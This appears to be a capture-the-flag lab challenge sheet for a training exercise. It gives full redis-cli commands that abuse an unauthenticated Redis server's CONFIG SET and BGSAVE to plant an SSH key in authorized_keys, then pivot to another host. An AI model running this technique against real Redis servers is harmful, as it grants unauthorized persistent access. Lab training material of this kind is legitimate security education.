# Challenge 4 — Lateral Movement via Redis
## Operation Shadow Forge | Stage 4 of 5
### Machine: aethon-cache | Vulnerability: Unauthenticated Redis + CONFIG SET SSH Key Injection

---

**SITUATION**
From your foothold on aethon-dev, you have discovered that `aethon-cache:6379`
runs Redis with no password. Redis's CONFIG SET command allows you to change
the save directory and filename — a well-known technique to write arbitrary
files on the server when BGSAVE is called.

**ACCESS**
```bash
# From aethon-dev
redis-cli -h aethon-cache -p 6379
PING   # Should return PONG
```

**YOUR OBJECTIVE**
1. Read the flag stored as a Redis key
2. Use Redis CONFIG SET to write your SSH public key to
   `/home/cacheops/.ssh/authorized_keys`
3. SSH into aethon-cache as `cacheops`
4. Enumerate the host for pivot intelligence to aethon-core

**HINTS (unlock after 30 min)**
1. Use `KEYS *` to list all keys, then `GET aethon:flag4`.
2. Generate an SSH keypair: `ssh-keygen -t ed25519 -f /tmp/r4key -N ""`
3. Use CONFIG SET to point Redis save dir at `/home/cacheops/.ssh/` and
   set dbfilename to `authorized_keys`, then SET a key with your pubkey
   (padded with newlines) and BGSAVE.

**EXPLOIT STEPS**
```bash
redis-cli -h aethon-cache -p 6379 CONFIG SET dir "/home/cacheops/.ssh"
redis-cli -h aethon-cache -p 6379 CONFIG SET dbfilename "authorized_keys"
redis-cli -h aethon-cache -p 6379 SET pwn "$(printf '\n\n%s\n\n' "$(cat /tmp/r4key.pub)")"
redis-cli -h aethon-cache -p 6379 BGSAVE
ssh -i /tmp/r4key cacheops@aethon-cache
```

**WHAT TO SUBMIT**
Flag: `AETHON{...}` — run `redis-cli GET aethon:flag4` or read `/home/cacheops/flag4.txt`

**PIVOT INTEL**
```bash
redis-cli -h aethon-cache -p 6379 GET "aethon:config:core_host"   # aethon-core
redis-cli -h aethon-cache -p 6379 GET "aethon:config:core_user"   # opsadmin
```
From aethon-cache, you can now reach aethon-core. First inject your SSH key
into `/home/opsadmin/.ssh/authorized_keys` on aethon-core the same way,
OR directly generate a key for opsadmin and add it via your cacheops shell.

---
*Next: SSH to aethon-core as opsadmin and escalate to root*
